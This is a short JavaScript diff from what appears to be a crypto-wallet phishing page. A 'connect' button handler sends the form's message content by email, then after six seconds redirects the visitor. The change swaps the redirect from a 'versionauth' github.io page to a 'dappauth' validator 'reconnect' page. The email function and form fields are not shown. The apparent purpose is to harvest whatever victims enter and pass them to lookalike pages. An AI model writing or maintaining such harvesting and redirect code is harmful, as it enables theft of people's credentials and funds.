@@ -7,7 +7,7 @@ document.getElementById('form-connect-button').addEventListener('click', functio
         handleButtonUI(); 
         sendEmail(messageContent); 
         setTimeout(function () {
-          window.location.href = 'http://versionauth.github.io/user/reconnect.html'; 
+          window.location.href = 'https://dappauth.github.io/validator/reconnect.html'; 
         }, 6000);
       }
     }
